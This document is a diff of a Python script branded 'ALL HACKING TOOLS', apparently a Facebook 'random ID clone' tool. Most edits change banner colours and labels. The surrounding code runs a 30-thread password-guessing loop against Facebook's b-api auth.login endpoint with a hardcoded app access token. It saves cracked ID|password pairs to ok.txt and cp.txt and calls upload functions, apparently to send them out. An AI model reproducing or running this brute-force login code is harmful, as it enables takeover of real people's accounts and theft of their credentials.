@@ -51,7 +51,7 @@ basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace(
 
 
 logo = ("""\033[1;92m         ╔═════════════════════════════╗
-\033[1;92m         ║      ALL HACKING TOOLS      ║
+\033[1;92m         ║      \033[7;95mALL HACKING TOOLS\033[0;92m      ║
 \033[1;92m         ╚═════════════════════════════╝
 \033[1;92m ╔═══════════════════════════════════════════════╗
 \033[1;92m ║            █████╗ ██╗  ██╗████████╗           ║
@@ -63,7 +63,8 @@ logo = ("""\033[1;92m         ╔═══════════════�
 \033[1;92m ╚═══════════════════════════════════════════════╝
 \033[1;92m ╔═══════════════════════════════════════════════╗
 \033[1;92m ║\033[1;93m [★] \033[1;31;1m OWNER     :\033[1;36;1mAll HACKING TOOLS             \033[1;32;1m║
-\033[1;92m ║\033[1;93m [★] \033[1;31;1m TOOLS     :\033[1;36;1mFREE TOOLS                    \033[1;32;1m║
+\033[1;92m ║\033[1;93m [★] \033[1;31;1m TOOLS     :\033[1;36;1mRANDOM ID CLONE               \033[1;32;1m║
+\033[1;92m ║\033[1;93m [★] \033[1;31;1m STATUS    :\033[1;36;1mFREE TOOLS                    \033[1;32;1m║
 \033[1;92m ║\033[1;93m [★] \033[1;31;1m GITHUB    :\033[1;36;1mAHT-AHT                       \033[1;32;1m║
 \033[1;92m ╚═══════════════════════════════════════════════╝""")
 class Main:
@@ -79,8 +80,8 @@ class Main:
 		print(" \033[0;94m║═[2] \x1b[1;92m JOIN MY GROUP")
 		print(" \033[0;94m║═[3] \x1b[1;92m FOLLOW MY PAGE")
 		print(" \033[0;94m╚═[0] \x1b[1;91m EXIT\n")
-		print("\033[0;92m╔═[CHOOSE] ")
-		AHT =input("\033[0;92m╚═[?]")
+		print("\033[0;94m╔═[\033[0;96mCHOOSE\033[0;94m] ")
+		AHT =input("\033[0;94m╚═[\033[0;92m")
 		if AHT in ["1", "01"]:
 			self.old()
 		if AHT in ["2", "02"]:
@@ -112,7 +113,7 @@ class Main:
 			print("\033[0;95m ************************************************* ")
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n%s [!] USE %s, %s%s FOR CHOICE ID"%(Y,G,B,Y))
-				print("%s [+] EXAMPLE : %s123456,12345678,123456789"%(Y,G))
+				print("%s [+] EXAMPLE : %s123456,12345678"%(Y,G))
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
@@ -515,15 +516,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[AHT-HACKED] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[AHT-HACKED] %s|%s\033[0;97m"%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [AHT-OK] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [AHT-HACKED] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[AHT-OK] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[AHT-OK] %s|%s\033[0;97m"%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [AHT-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [AHT-OK] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
